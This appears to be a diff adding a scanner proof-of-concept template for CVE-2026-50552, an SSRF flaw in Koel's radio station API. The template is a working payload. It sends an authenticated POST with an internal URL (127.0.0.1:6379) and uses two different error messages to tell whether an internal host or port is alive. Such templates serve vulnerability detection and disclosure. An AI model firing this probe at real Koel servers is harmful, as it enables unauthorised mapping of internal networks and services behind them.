@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "Koel 广播电台创建接口 (POST /api/radio/stations) 存在 SSRF 漏洞，缺少 bail 关键字导致 SafeUrl 规则拦截后 HasAudioContentType 仍向内网地址发起 HEAD/GET 请求。通过对比两种不同错误信息可实现内网存活主机/端口探测。"
+id = "POC-AVE-2026-0358"
+name = "CVE-2026-50552 PoC"
+severity = "medium"
+tags = ["ave-2026-0358"]
+vuln_id = [
+    "CVE-2026-50552",
+    "AVE-2026-0358",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/radio/stations"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"name": "probe", "url": "http://127.0.0.1:6379"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{Token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["The url doesn't look like a valid radio station URL."]
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["The url couldn't be reached."]
